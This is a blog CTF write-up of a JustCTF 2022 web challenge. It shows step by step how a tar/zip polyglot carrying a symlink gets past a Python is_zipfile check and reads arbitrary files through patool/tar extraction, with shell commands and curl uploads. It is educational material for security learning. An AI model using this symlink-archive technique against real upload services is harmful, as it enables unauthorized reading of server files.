<!DOCTYPE html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"
><head>
  <meta charset="utf-8" />
  
    <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>Zip Slip Vulnerability - Justctf 2022 &middot; Trevor Saudi</title>
    <meta name="title" content="Zip Slip Vulnerability - Justctf 2022 &middot; Trevor Saudi" />
  
  <meta name="description" content="Portfolio/blog" />
  
  
  
  <link rel="canonical" href="https://trevorsaudi.com/posts/2022-06-13_zipslip-vulnerability-justctf2022/" />
  
  
  
  
  
  
  
  
  
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.6392876d35eabbaa711ea81779afb0cae5109113f7350f65e95aea1bd21e6e638b4ce9495a6786c3cee07affcc31970317defd77804c71f0ddae3a395649e93a.css"
    integrity="sha512-Y5KHbTXqu6pxHqgXea&#43;wyuUQkRP3NQ9l6VrqG9IebmOLTOlJWmeGw87gev/MMZcDF979d4BMcfDdrjo5VknpOg=="
  />
  
  
  <script type="text/javascript" src="/js/appearance.min.4df8309499991be53c71b2b39ba0f5d5e77ea7d411d0710ce48c24218e7cc24ded28f19e85838fdc56db2306195cb001f049f577be0cf0ffb2dd6e2037ede1b9.js" integrity="sha512-TfgwlJmZG&#43;U8cbKzm6D11ed&#43;p9QR0HEM5IwkIY58wk3tKPGehYOP3FbbIwYZXLAB8En1d74M8P&#43;y3W4gN&#43;3huQ=="></script>
  
    
    
    
  
  
    
    
  
  
  
    
    <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.61ddd918b834d47011bb8923606e0c3814bbcec0f2d5ab743171ca58a52eea55eb74d2f5ea267d6398ccaf6cabb0360c61b93e541ed4892fddf757fd2d317822.js" integrity="sha512-Yd3ZGLg01HARu4kjYG4MOBS7zsDy1at0MXHKWKUu6lXrdNL16iZ9Y5jMr2yrsDYMYbk&#43;VB7UiS/d91f9LTF4Ig==" data-copy="Copy" data-copied="Copied"></script>
  
  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
    <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  <meta property="og:title" content="Zip Slip Vulnerability - Justctf 2022" />
<meta property="og:description" content="An overview of the zip slip vulnerability in a python application." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://trevorsaudi.com/posts/2022-06-13_zipslip-vulnerability-justctf2022/" /><meta property="og:image" content="https://trevorsaudi.com/posts/2022-06-13_Zipslip-vulnerability-Justctf2022/images/1.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2022-06-13_Zipslip-vulnerability-Justctf2022/images/2.png" /><meta property="og:image" content="https://trevorsaudi.com/posts/2022-06-13_Zipslip-vulnerability-Justctf2022/images/3.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-13T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-06-13T00:00:00+00:00" /><meta property="og:site_name" content="Trevor Saudi" />


  <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://trevorsaudi.com/posts/2022-06-13_Zipslip-vulnerability-Justctf2022/images/1.png"/>

<meta name="twitter:title" content="Zip Slip Vulnerability - Justctf 2022"/>
<meta name="twitter:description" content="An overview of the zip slip vulnerability in a python application."/>

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Zip Slip Vulnerability - Justctf 2022",
    "headline": "Zip Slip Vulnerability - Justctf 2022",
    
    "abstract": "An overview of the zip slip vulnerability in a python application.",
    "inLanguage": "en",
    "url" : "https:\/\/trevorsaudi.com\/posts\/2022-06-13_zipslip-vulnerability-justctf2022\/",
    "author" : {
      "@type": "Person",
      "name": "Trevor Saudi"
    },
    "copyrightYear": "2022",
    "dateCreated": "2022-06-13T00:00:00\u002b00:00",
    "datePublished": "2022-06-13T00:00:00\u002b00:00",
    
    "dateModified": "2022-06-13T00:00:00\u002b00:00",
    
    "keywords": ["python","Zip Slip","polyglots"],
    
    "mainEntityOfPage": "true",
    "wordCount": "1129"
  }]
  </script>


  
  <meta name="author" content="Trevor Saudi" />
  
    
      <link href="https://github.com/trevorsaudi" rel="me" />
    
      <link href="https://www.linkedin.com/in/trevor-saudi-9275b8186" rel="me" />
    
  
  
  






  
  
  
  


  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 bg-neutral text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral max-w-7xl"
  >
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 dark:bg-neutral-600 focus:translate-y-0"
        href="#main-content"
        ><span class="font-bold ltr:pr-2 rtl:pl-2 text-primary-600 dark:text-primary-400"
          >&darr;</span
        >Skip to main content</a
      >
    </div><header
  class="flex justify-between py-6 font-semibold sm:items-center sm:py-10 text-neutral-900 dark:text-neutral print:hidden"
>
  
  <div>
    
      
    
    

  </div>
  
  
    <nav>
      <ul class="flex flex-col list-none sm:flex-row">
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/"
              title=""
              >Home</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/posts/"
              title="Posts"
              >Posts</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/about/"
              title=""
              >About</a
            >
          </li>
        
          <li
            class="mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <a
              class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
              href="/tags/"
              title="Tags"
              >Tags</a
            >
          </li>
        
        
          <li
            class="ltr:text-right rtl:text-left ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0"
          >
            <button
              id="search-button"
              class="text-base hover:text-primary-600 dark:hover:text-primary-400"
              title="Search (/)"
            >
              

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
          </li>
        
      </ul>
    </nav>
  
</header>
<div class="relative">
      <main id="main-content" class="grow">
  <article>
    <header class="max-w-prose">
      
        <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      ></a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/2022-06-13_zipslip-vulnerability-justctf2022/"
      >Zip Slip Vulnerability - Justctf 2022</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Zip Slip Vulnerability - Justctf 2022
      </h1>
      <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
    
  

  

  

  
    
  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2022-06-13 00:00:00 &#43;0000 UTC">13 June 2022</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">6 mins</span>
    

    
    
  </div>

  
  


      </div>
    </header>
    <section class="flex flex-col max-w-full mt-0 prose lg:flex-row dark:prose-invert">
      
        <div class="order-first px-0 lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8 lg:order-last">
          <div class="ltr:pl-5 rtl:pr-5 toc lg:sticky lg:top-10 print:hidden">
            <details open class="mt-0 overflow-hidden rounded-lg rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 lg:mt-3">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 text-neutral-800 dark:text-neutral-100 lg:hidden bg-neutral-100 dark:bg-neutral-700"
  >
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted ltr:border-l rtl:border-r rtl:pr-5 ltr:pl-5 ltr:-ml-5 rtl:-mr-5 border-neutral-300 dark:border-neutral-600"
  >
    <nav id="TableOfContents">
  <ul>
    <li><a href="#overview">Overview</a></li>
    <li><a href="#local-testing">Local Testing</a></li>
    <li><a href="#code-review">Code Review</a></li>
    <li><a href="#bypassing-is_zipfile-using-polyglots">Bypassing is_zipfile using polyglots</a></li>
    <li><a href="#testing-our-exploit-locally">Testing our exploit locally</a>
      <ul>
        <li><a href="#1-creating-a-symlink-file">1. Creating a symlink file</a></li>
        <li><a href="#2-creating-a-zip-file-and-tar-file">2. Creating a zip file and tar file</a></li>
        <li><a href="#3-creating-the-polyglot">3. Creating the polyglot</a></li>
        <li><a href="#4-final-exploit">4. Final exploit</a></li>
      </ul>
    </li>
    <li><a href="#testing-remotely">Testing remotely</a></li>
  </ul>
</nav>
  </div>
</details>

          </div>
        </div>
      
      <div class="min-w-0 min-h-0 max-w-prose">
        <p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/zip.jpg" alt="image" />
      
    </figure>
  

</p>
<p><em>An overview of the zip slip vulnerability in a python application.</em></p>
<h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2>
<p>Zip Slip is a widespread arbitrary file overwrite vulnerability that typically results in remote code execution. Discovered in June 5th 2018 by the Snyk Research team, it affects thousands of projects.</p>
<p>The vulnerablity affects ecosystems that have no central library offering high level processing of archive files. Several web applications allow users to submit files in compressed format to reduce the size of files being uploaded. Later on, the compressed files get decompressed to retrieve to actual files. Zip Slip aims to target such applications</p>
<p>In a previously concluded CTF - JustCTF 2022, one of the web challenges features a web application vulnerable to the Zip Slip vulnerability. We will look at how the exploit to achieve an arbitrary file read on the server works.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/1.png" alt="image" />
      
    </figure>
  

</p>
<h2 id="local-testing" class="relative group">Local Testing <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#local-testing" aria-label="Anchor">#</a></span></h2>
<p>The challenge consists of a REST API endpoint that receives a zip file via HTTP POST and returns a JSON object containing the contents of every file in the zip.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/2.png" alt="image" />
      
    </figure>
  

</p>
<p>We are also provided with the back-end code for the REST API linked <a href="https://github.com/trevorsaudi/dockerized-zip-slip">here</a> that you can run and host the application locally using docker.</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/5.png" alt="image" />
      
    </figure>
  

</p>
<p>Let us upload a zip file and see how the application interacts with it.</p>
<p>Create the zip file</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/6.png" alt="image" />
      
    </figure>
  

</p>
<p>Upload the zip file to the application using curl</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> curl -X <span class="s1">&#39;POST&#39;</span> <span class="se">\
</span><span class="se"></span>  <span class="s1">&#39;http://localhost/extract&#39;</span> <span class="se">\
</span><span class="se"></span>  -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="se">\
</span><span class="se"></span>  -H <span class="s1">&#39;Content-Type: multipart/form-data&#39;</span> <span class="se">\
</span><span class="se"></span>  -F <span class="s1">&#39;file=@test.zip;type=application/zip&#39;</span>
<span class="o">{</span><span class="s2">&#34;test.txt&#34;</span>:<span class="s2">&#34;hello\n&#34;</span><span class="o">}</span>%
</code></pre></div><p>The server&rsquo;s response is captured below:</p>
<p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/8.png" alt="image" />
      
    </figure>
  

</p>
<h2 id="code-review" class="relative group">Code Review <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#code-review" aria-label="Anchor">#</a></span></h2>
<p>In summary, our application is using 2 key libraries: zipfile and patoolib to validate the uploaded archive and to decompress the archive to retrieve the contents.</p>
<p>In server.py, we begin by importing our key libraries:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">zipfile</span> <span class="kn">import</span> <span class="n">is_</span> <span class="n">zipfile</span>
<span class="o">.</span>
<span class="o">.</span>
<span class="o">.</span>
<span class="kn">from</span> <span class="nn">patoolib</span> <span class="kn">import</span> <span class="n">extract_archive</span>
</code></pre></div><p>This block of code is where the magic happens. <code>is_zipfile</code> is used to validate whether the uploaded file is a zip file, and throws an error if it isn&rsquo;t.</p>
<p><code>extract_archive</code> is used to extract the contents of the zip file and stores the contents in a directory</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">if</span> <span class="ow">not</span> <span class="n">is_zipfile</span><span class="p">(</span><span class="n">file_to_extract</span><span class="p">):</span>
        <span class="k">raise</span> <span class="n">HTTPException</span><span class="p">(</span><span class="n">status_code</span><span class="o">=</span><span class="mi">415</span><span class="p">,</span> <span class="n">detail</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;The input file must be an ZIP archive.&#34;</span><span class="p">)</span>
    <span class="k">with</span> <span class="n">TemporaryDirectory</span><span class="p">(</span><span class="nb">dir</span><span class="o">=</span><span class="n">tmpdir</span><span class="p">)</span> <span class="k">as</span> <span class="n">extract_to_dir</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">extract_archive</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">file_to_extract</span><span class="p">),</span> <span class="n">outdir</span><span class="o">=</span><span class="n">extract_to_dir</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">PatoolError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">HTTPException</span><span class="p">(</span><span class="n">status_code</span><span class="o">=</span><span class="mi">400</span><span class="p">,</span> <span class="n">detail</span><span class="o">=</span><span class="sa">f</span><span class="s2">&#34;Error extracting ZIP </span><span class="si">{</span><span class="n">file_to_extract</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">!s}</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">read_files</span><span class="p">(</span><span class="n">extract_to_dir</span><span class="p">)</span>
</code></pre></div><p>According to the research done by Snyk linked <a href="https://snyk.io/blog/behind-the-disclosure-the-zip-slip-vulnerability/">here</a> <code>zipfile</code> python module is not vulnerable to the zip slip vulnerability since it does not support symlinks as also indicated in the comments.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># make sure the file is a valid zip because Python&#39;s</span>
<span class="c1"># zipfile doesn&#39;t support symlinks (no hacking!)</span>
</code></pre></div><p>So how then will we approach the exploit?</p>
<p>It is worth noting that tarfile happens to still be affected. Patool libary being used has a cross format feature allows you to extract any type of archive including the most popular ones such as ZIP, GZIP, TAR and RAR.</p>
<h2 id="bypassing-is_zipfile-using-polyglots" class="relative group">Bypassing is_zipfile using polyglots <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#bypassing-is_zipfile-using-polyglots" aria-label="Anchor">#</a></span></h2>
<p>The implementation of <code>zipfile</code> to check if the upload is a valid zip file can be abused in this case. <code>zipfile</code> module checks for magic bytes in the archive to verify if it a valid zip file.</p>
<p>We can create a polyglot file (a file that is valid for with different file formats), that is both a zip and tar, to pass the zip check, and to perform a &lsquo;tar slip&rsquo; that will read the contents of our flag from the server.</p>
<p>An awesome tool called <code>Mitra</code> can create polyglots for us. Linked <a href="https://github.com/corkami/mitra">here</a></p>
<h2 id="testing-our-exploit-locally" class="relative group">Testing our exploit locally <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#testing-our-exploit-locally" aria-label="Anchor">#</a></span></h2>
<h3 id="1-creating-a-symlink-file" class="relative group">1. Creating a symlink file <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-creating-a-symlink-file" aria-label="Anchor">#</a></span></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;flag{test}&#34;</span> &gt; flag.txt <span class="c1">#ensure flag.txt is in /server directory</span>
ln -fs /home/saudi/Desktop/CTF/justCTF/web/
symple_unzipper/server/flag.txt flag.lnk <span class="c1">#absolute path to the location of the flag</span>
</code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ls -la
lrwxrwxrwx <span class="m">1</span> saudi saudi    <span class="m">67</span> Jul  <span class="m">8</span> 18:39 flag.lnk -&gt; /home/saudi/Desktop/CTF/justCTF/web/symple_unzipper/server/flag.txt
</code></pre></div><h3 id="2-creating-a-zip-file-and-tar-file" class="relative group">2. Creating a zip file and tar file <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2-creating-a-zip-file-and-tar-file" aria-label="Anchor">#</a></span></h3>
<p>We will create a zip file which will be combined with a tar file to create a tar-zip polyglot. In this case since we are attempting to exploit the vulnerability via the tar file, we shall compress the symlink file as a tar, then combine with a sample zip that will help bypass the check</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">touch a
zip test.zip -xi a
tar -cvf flag.tar flag.txt
</code></pre></div><p>We now have 2 files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">-rw-rw-r-- <span class="m">1</span> saudi saudi   <span class="m">171</span> Jul  <span class="m">8</span> 12:18  test.zip
-rw-rw-r-- <span class="m">1</span> saudi saudi   <span class="m">171</span> Jul  <span class="m">8</span> 12:18  flag.tar

</code></pre></div><h3 id="3-creating-the-polyglot" class="relative group">3. Creating the polyglot <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-creating-the-polyglot" aria-label="Anchor">#</a></span></h3>
<p>Mitra will come into play now, combining the 2 files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">python3</span> <span class="n">mitra</span><span class="o">.</span><span class="n">py</span> <span class="n">flag</span><span class="o">.</span><span class="n">tar</span> <span class="n">test</span><span class="o">.</span><span class="n">zip</span>

<span class="n">File</span> <span class="mi">1</span><span class="p">:</span> <span class="n">TAR</span> <span class="o">/</span> <span class="n">Tape</span> <span class="n">Archive</span>
<span class="o">../</span><span class="n">test</span><span class="o">.</span><span class="n">zip</span>
<span class="n">File</span> <span class="mi">2</span><span class="p">:</span> <span class="n">Zip</span>

<span class="n">Stack</span><span class="p">:</span> <span class="n">concatenation</span> <span class="n">of</span> <span class="n">File1</span> <span class="p">(</span><span class="nb">type</span> <span class="n">TAR</span><span class="p">)</span> <span class="ow">and</span> <span class="n">File2</span> <span class="p">(</span><span class="nb">type</span> <span class="n">Zip</span><span class="p">)</span>
<span class="n">Parasite</span><span class="p">:</span> <span class="n">hosting</span> <span class="n">of</span> <span class="n">File2</span> <span class="p">(</span><span class="nb">type</span> <span class="n">Zip</span><span class="p">)</span> <span class="ow">in</span> <span class="n">File1</span> <span class="p">(</span><span class="nb">type</span> <span class="n">TAR</span><span class="p">)</span>

</code></pre></div><p>This results into 2 weird looking files:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">-rw-rw-r-- <span class="m">1</span> saudi saudi <span class="m">11264</span> Jul  <span class="m">8</span> 12:23 <span class="s1">&#39;P(200-400)-TAR[Zip].50a7da6d.tar.zip&#39;</span>
-rw-rw-r-- <span class="m">1</span> saudi saudi <span class="m">10411</span> Jul  <span class="m">8</span> 12:23 <span class="s1">&#39;S(2800)-TAR-Zip.b9f05edc.zip.tar&#39;</span>
</code></pre></div><p>Let us test if the zip that is a tar can be decompressed via unzip and tar:</p>
<ol>
<li>unzip</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mv  <span class="s1">&#39;S(2800)-TAR-Zip.b9f05edc.zip.tar&#39;</span> payload.tar
unzip payload.tar
Archive:  payload.tar
warning <span class="o">[</span>payload.tar<span class="o">]</span>:  <span class="m">10240</span> extra bytes at beginning or within zipfile
<span class="o">(</span>attempting to process anyway<span class="o">)</span>
extracting: test.txt
</code></pre></div><ol start="2">
<li>tar</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">tar -xvf payload.tar
test.ln
</code></pre></div><p>As expected the file behaves both as a tar and zip which is pretty cool.</p>
<p>I preferred this simple approach of creating the polyglot</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">tar -cvf payload.tar flag.txt test.zip
</code></pre></div><p>Let us upload this to our local server using curl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl -X <span class="s1">&#39;POST&#39;</span> <span class="se">\
</span><span class="se"></span>   <span class="s1">&#39;http://localhost/extract&#39;</span> <span class="se">\
</span><span class="se"></span>   -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="se">\
</span><span class="se"></span>   -H <span class="s1">&#39;Content-Type: multipart/form-data&#39;</span> <span class="se">\
</span><span class="se"></span>   -F <span class="s1">&#39;file=@payload.tar;type=application/tar&#39;</span>

<span class="o">{</span><span class="s2">&#34;detail&#34;</span>:<span class="s2">&#34;Error extracting ZIP payload.tar: Command `[&#39;/bin/tar&#39;, &#39;--extract&#39;, &#39;--file&#39;, &#39;/server/uploads/tmpovbgeaw_/payload.tar&#39;, &#39;--directory&#39;, &#39;/server/uploads/tmpovbgeaw_/tmpsavfbv2m&#39;]&#39; returned non-zero exit status 2&#34;</span><span class="o">}</span>%
</code></pre></div><p>Interestingly enough, this fails. The server output gives the error below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">server-server-1  <span class="p">|</span> /bin/tar: test.ln: Cannot change ownership to uid 1000, gid 1000: Operation not permitted
server-server-1  <span class="p">|</span> /bin/tar: Exiting with failure status due to previous errors
server-server-1  <span class="p">|</span> patool: Extracting /server/uploads/tmpovbgeaw_/payload.tar ...
server-server-1  <span class="p">|</span> patool: running /bin/tar --extract --file /server/uploads/tmpovbgeaw_/payload.tar --directory /server/uploads/tmpovbgeaw_/tmpsavfbv2m
server-server-1  <span class="p">|</span> INFO:     172.19.0.1:57988 - <span class="s2">&#34;POST /extract HTTP/1.1&#34;</span> <span class="m">400</span> Bad Request
</code></pre></div><p>The server returns a permissions error. Since the server is running as root we need to modify the permission of the symlink we are uploading so that it runs with the effective permissions of the server</p>
<h3 id="4-final-exploit" class="relative group">4. Final exploit <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#4-final-exploit" aria-label="Anchor">#</a></span></h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">
ln -fs /home/saudi/Desktop/CTF/justCTF/web/symple_unzipper/server/flag.txt flag.lnk
<span class="c1">#absolute path to the flag in my server directory</span>
<span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> &gt; test.txt
zip test.zip test.txt
tar --owner<span class="o">=</span>root --group<span class="o">=</span>root -cvf payload.tar flag.txt test.zip
</code></pre></div><p>Upload the tar to the server</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl -X <span class="s1">&#39;POST&#39;</span> <span class="se">\
</span><span class="se"></span>   <span class="s1">&#39;http://localhost/extract&#39;</span> <span class="se">\
</span><span class="se"></span>   -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="se">\
</span><span class="se"></span>   -H <span class="s1">&#39;Content-Type: multipart/form-data&#39;</span> <span class="se">\
</span><span class="se"></span>   -F <span class="s1">&#39;file=@payload.tar;type=application/tar&#39;</span>

<span class="o">{</span><span class="s2">&#34;test.zip&#34;</span>:<span class="s2">&#34;UEsDBAoAAAAAACiW6FTGNbk7BQAAAAUAAAAIABwAdGVzdC50eHRVVAkAA/tRyGKPT8hidXgLAAEE6AMAAAToAwAAdGVzdApQSwECHgMKAAAAAAAoluhUxjW5OwUAAAAFAAAACAAYAAAAAAABAAAAtIEAAAAAdGVzdC50eHRVVAUAA/tRyGJ1eAsAAQToAwAABOgDAABQSwUGAAAAAAEAAQBOAAAARwAAAAAA&#34;</span>,<span class="s2">&#34;flag.txt&#34;</span>:<span class="s2">&#34;flag{test}\n&#34;</span><span class="o">}</span>%
</code></pre></div><p>The curl request returns content of our flag. We achieved arbitrary file read on the server.</p>
<p>Response from the server</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">server-server-1  <span class="p">|</span> patool: ... /server/uploads/tmpezs70207/payload.tar extracted to <span class="sb">`</span>/server/uploads/tmpezs70207/tmp79dnbr8m<span class="err">&#39;</span>.
server-server-1  <span class="p">|</span> INFO:     172.19.0.1:58136 - <span class="s2">&#34;POST /extract HTTP/1.1&#34;</span> <span class="m">200</span> OK
</code></pre></div><h2 id="testing-remotely" class="relative group">Testing remotely <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#testing-remotely" aria-label="Anchor">#</a></span></h2>
<p>Curl the server</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"> curl -X <span class="s1">&#39;POST&#39;</span> <span class="se">\
</span><span class="se"></span>  <span class="s1">&#39;http://symple-unzipper.web.jctf.pro/extract&#39;</span> <span class="se">\
</span><span class="se"></span>  -H <span class="s1">&#39;accept: application/json&#39;</span> <span class="se">\
</span><span class="se"></span>  -H <span class="s1">&#39;Content-Type: multipart/form-data&#39;</span> <span class="se">\
</span><span class="se"></span>  -F <span class="s1">&#39;file=@payload.tar;type=application/x-tar&#39;</span>
</code></pre></div><p>



  
  
  
    <figure>
      <img class="my-0 rounded-md" src="/posts/2022-06-13_zipslip-vulnerability-justctf2022/images/4.png" alt="image" />
      
    </figure>
  

</p>
<p>We get the flag from the server.</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      

      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
